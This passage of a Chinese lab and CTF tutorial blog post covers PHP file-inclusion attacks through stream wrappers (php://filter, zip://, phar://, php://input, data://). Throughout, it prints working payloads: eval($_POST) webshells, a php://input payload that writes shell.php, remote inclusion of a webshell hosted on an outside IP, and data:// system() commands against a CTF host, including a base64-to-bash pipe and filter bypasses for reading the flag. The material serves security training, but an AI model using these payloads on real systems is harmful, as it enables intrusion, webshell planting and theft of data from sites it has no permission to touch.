+<h5 id="可以利用此来包含一句话木马"><a href="#可以利用此来包含一句话木马" class="headerlink" title="可以利用此来包含一句话木马"></a>可以利用此来包含一句话木马</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=文件名.php</span><br></pre></td></tr></table></figure>
+
+<p>将一句话木马编码后放置在远程服务器上</p>
+<p><img src="/images%5C1665550009883-f247beb2-fa3c-485b-aff5-2b4d2abc0b34.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:88/DX/file_include/index.php?file=php://filter/read=convert.base64-decode/resource=http://101.35.17.6:6666/test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=php://filter/read=convert.base64-decode/resource=http://101.35.17.6:6666/test.txt</a></p>
+<p><img src="/images%5C1665550111038-486f417d-e512-4b90-bb8b-3c4fd955668f.png" alt="img"></p>
+<p><img src="/images%5C1665550147767-2eb9da43-df4f-403b-80ab-f6b11ffa004b.png" alt="img"></p>
+<h5 id="读取payload"><a href="#读取payload" class="headerlink" title="读取payload"></a>读取payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=/resource=test.txt</span><br><span class="line"></span><br><span class="line">file=php://filter//resource=test.txt</span><br><span class="line">//注意那两斜杠不能省</span><br><span class="line"></span><br><span class="line">base64编码解码</span><br><span class="line">file=php://filter/convert.base64-encode/resource=test.txt</span><br><span class="line">file=php://filter/convert.base64-decode/resource=test.txt</span><br><span class="line"></span><br><span class="line">file=php://filter/read=convert.base64-encode/resource=test.txt</span><br></pre></td></tr></table></figure>
+
+<p>任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</p>
+<p><img src="/images%5C1667208263840-995730b8-919e-413b-8c23-20de1420ef72.png" alt="img"></p>
+<h3 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><p>读取压缩包内的文件(绝对路径)</p>
+<h5 id="限制条件-1"><a href="#限制条件-1" class="headerlink" title="限制条件"></a>限制条件</h5><p>allow_url_include:off</p>
+<p>allow_url_fopen:on</p>
+<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>使用绝对路径</p>
+<p>必须是zip文件，但后缀无所谓</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zip://绝对路径/压缩包文件#压缩包内的文件</span><br><span class="line"></span><br><span class="line">注意，#号必须url编码</span><br><span class="line"></span><br><span class="line">?file=zip://绝对路径/文件名%23压缩包内的文件</span><br></pre></td></tr></table></figure>
+
+<p>注意，#号必须url编码</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:88/DX/file_include/index.php?file=zip://D:/Desktop/test.zip%23test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=zip://D:/Desktop/test.zip%23test.txt</a></p>
+<p><img src="/images%5C1665551479736-692dab58-19ba-4b50-919f-ba7a2728234f.png" alt="img"></p>
+<p>.zip可以改为其他任意后缀，只要文件内容是zip的内容，就能通过zip协议正常解析</p>
+<p><img src="/images%5C1665551787085-f3974026-477a-4d9f-a0e6-6d73ee681d22.png" alt="img"></p>
+<h3 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>读取压缩包内的文件(绝对路径，相对路径都可以)</p>
+<h5 id="限制条件-2"><a href="#限制条件-2" class="headerlink" title="限制条件"></a>限制条件</h5><p>allow_url_include:off</p>
+<p>allow_url_fopen:on</p>
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>使用绝对路径即可</p>
+<p><img src="/images%5C1665552085670-d65faa8e-7c35-4bd4-b7c6-3ddb931d96f3.png" alt="img"></p>
+<p>同样，后缀不影响</p>
+<p><img src="/images%5C1665552219256-d3e33144-a285-4508-a9eb-1b3d113ec534.png" alt="img"></p>
+<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>该伪协议用在远程文件包含中</p>
+<p>将post请求中的数据作为php代码执行</p>
+<h5 id="限制条件-3"><a href="#限制条件-3" class="headerlink" title="限制条件"></a>限制条件</h5><p>allow_url_include:on (默认off)</p>
+<p>allow_url_fopen:on&#x2F;off （默认on）</p>
+<h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://input</span><br></pre></td></tr></table></figure>
+
+<p>include函数会将post的body中的php代码解析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php @eval($_POST[123]);?&gt;&#x27;)?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5C1665552740842-2fc06e76-2a33-47f5-91ad-54966d86098b.png" alt="img"></p>
+<p>成功写入shell</p>
+<p><img src="/images%5C1665552781766-418dfd08-3f0f-49d1-aca6-583a39cba4d9.png" alt="img"></p>
+<p>成功连接</p>
+<p><img src="/images%5C1665552813790-cfd814e9-89fd-451e-ae0e-62cb1174fa20.png" alt="img"></p>
+<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>读取数据流，如果传入的数据是php代码，就会执行代码</p>
+<h5 id="限制条件-4"><a href="#限制条件-4" class="headerlink" title="限制条件"></a>限制条件</h5><p>allow_url_include:on (默认off)</p>
+<p>allow_url_fopen:on（默认on）</p>
+<h5 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">?file=data:text/plain,base64,（php的base64编码内容）</span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5C1665552983029-fcb88f2c-8787-4b43-adc0-f4dcf6ba34ad.png" alt="img"></p>
+<h4 id="可以包含一句话木马"><a href="#可以包含一句话木马" class="headerlink" title="可以包含一句话木马"></a>可以包含一句话木马</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php eval($_POST[&quot;test&quot;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5C1665553091038-929159af-6752-4d6a-94a3-3aa1efbf9c89.png" alt="img"></p>
+<h2 id="一道CTF题"><a href="#一道CTF题" class="headerlink" title="一道CTF题"></a>一道CTF题</h2><p>这是后面做完后读到的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">  if(strstr($_GET[&#x27;file&#x27;],&#x27;data://&#x27;) or $_GET[&#x27;file&#x27;]===&#x27;hello.txt&#x27;)</span><br><span class="line">  &#123;</span><br><span class="line">    if(preg_match(&quot;/(flag)/i&quot;,$_GET[&#x27;file&#x27;]) == 1)</span><br><span class="line">    &#123;</span><br><span class="line">      die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      include $_GET[&#x27;file&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#x27;你以为你想包含什么就包含什么嘛？&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  header(&quot;Location:./index.php?file=hello.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码解读"><a href="#代码解读" class="headerlink" title="代码解读"></a>代码解读</h3><p>首先要通过get请求传递file参数</p>
+<p>然后看参数中是否有data:&#x2F;&#x2F;或者file是否等于hello.txt</p>
+<p>参数中不能包括flag</p>
+<h3 id="ls查看文件"><a href="#ls查看文件" class="headerlink" title="ls查看文件"></a>ls查看文件</h3><p><a target="_blank" rel="noopener" href="http://218.94.126.122:31003/index.php?file=data://text/plain,">http://218.94.126.122:31003/index.php?file=data://text/plain,%3C?php%20system(%22ls%22);?%3E</a></p>
+<p><img src="/images%5C1665988456872-620d4754-4c28-4824-ad98-c94cc9121279.png" alt="img"></p>
+<p>不能直接cat该文件，因为包含“flag”</p>
+<p><a target="_blank" rel="noopener" href="http://218.94.126.122:31003/index.php?file=data://text/plain,">http://218.94.126.122:31003/index.php?file=data://text/plain,%3C?php%20system(%22cat%20flag_sdhalsd.php%22);?%3E</a></p>
+<p><img src="/images%5C1665988596163-a8ab4cfd-0c5f-4f47-aea6-f1020bf0d755.png" alt="img"></p>
+<h3 id="绕过“flag”"><a href="#绕过“flag”" class="headerlink" title="绕过“flag”"></a>绕过“flag”</h3><h5 id="1-可以通过cat-f-读取当前目录所有f开头的文件"><a href="#1-可以通过cat-f-读取当前目录所有f开头的文件" class="headerlink" title="1.可以通过cat f*读取当前目录所有f开头的文件"></a>1.可以通过cat f*读取当前目录所有f开头的文件</h5><p><img src="/images%5C1665988872945-496b2ace-1bd1-4fce-ad7f-8da9e42d1e28.png" alt="img"></p>
+<h5 id="2-base64绕过"><a href="#2-base64绕过" class="headerlink" title="2.base64绕过"></a>2.base64绕过</h5><p><img src="/images%5C1665989231978-3ba62296-6db8-447f-bf9e-cce19cb8b604.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;Y2F0IGZsYWdfc2RoYWxzZC5waHA=&#x27;|base64 -d|bash</span><br><span class="line">http://218.94.126.122:31003/index.php?file=data://text/plain,&lt;?php system(&quot;echo &#x27;Y2F0IGZsYWdfc2RoYWxzZC5waHA=&#x27;|base64 -d|bash&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-反斜杠绕过"><a href="#3-反斜杠绕过" class="headerlink" title="3.反斜杠绕过"></a>3.反斜杠绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;cat fl\ag_sdhalsd.php&quot;);?&gt;</span><br><span class="line">http://218.94.126.122:31003/index.php?file=data://text/plain,&lt;?php system(&quot;cat fl\ag_sdhalsd.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="4-1，-2和-绕过"><a href="#4-1，-2和-绕过" class="headerlink" title="4.$1，$2和$@绕过"></a>4.$1，$2和$@绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat fl$1ag_sdhalsd.php</span><br><span class="line">http://218.94.126.122:31003/index.php?file=data://text/plain,&lt;?php system(&quot;cat fl$1ag_sdhalsd.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="本地文件包含-2"><a href="#本地文件包含-2" class="headerlink" title="本地文件包含"></a>本地文件包含</h1><p>本地文件包含，顾名思义就是包含本地的文件</p>
+<p>可以写一个测试代码(该测试代码也可远程文件包含)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">include $file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:88/DX/file_include/index.php?file=test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=test.txt</a></p>
+<p><img src="/images%5Cimage-20230110103343335.png" alt="image-20230110103343335"></p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><img src="/images%5Cimage-20230110103439657.png" alt="image-20230110103439657"></p>
+<p>可以看到传参为filename读取本地文件</p>
+<p>更改为file2.php</p>
+<p><img src="/images%5Cimage-20230110103559613.png" alt="image-20230110103559613"></p>
+<p>如果此时能够通过文件上传或其他方式写入一个webshell，就可以通过本地文件包含访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>url为(不一定为php文件，txt里面放个木马也行)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/fileinclude/fi_local.php?filename=../../../../shell.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cimage-20230110104124430.png" alt="image-20230110104124430"></p>
+<h1 id="远程文件包含-2"><a href="#远程文件包含-2" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><p>远程文件包含，顾名思义，可以包含远程文件，如果源代码使用的是include,，那么包含的文件都会被显示出来，不一定是php</p>
+<p>可以写一个测试代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">include $file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:88/DX/file_include/index.php?file=http://www.baidu.com">http://127.0.0.1:88/DX/file_include/index.php?file=http://www.baidu.com</a></p>
+<p><img src="/images%5Cimage-20230110104347093.png" alt="image-20230110104347093"></p>
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p>可以在自己的服务器上放一个木马，远程文件包含利用</p>
+<p><img src="/images%5Cimage-20230110104804316.png" alt="image-20230110104804316"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//其一个http服务供访问，监听22222端口</span><br><span class="line"></span><br><span class="line">python3 -m http.server 22222</span><br></pre></td></tr></table></figure>
+
+<h5 id="远程文件包含-3"><a href="#远程文件包含-3" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><p>url为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/file_include/index.php?file=http://x.x.x.x:22222/test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cimage-20230110104922768.png" alt="image-20230110104922768"></p>
+<h3 id="伪协议利用"><a href="#伪协议利用" class="headerlink" title="伪协议利用"></a>伪协议利用</h3><p>使用data:text&#x2F;plain,伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain,&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>url为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:88/DX/file_include/index.php?file=data:text/plain,&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cimage-20230110105123160.png" alt="image-20230110105123160"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" rel="prev" title="pikachu靶场系列-目录遍历">
+                  <i class="fa fa-chevron-left"></i> pikachu靶场系列-目录遍历
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="next" title="pikachu靶场系列-文件上传">
+                  pikachu靶场系列-文件上传 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fn</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>-->
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
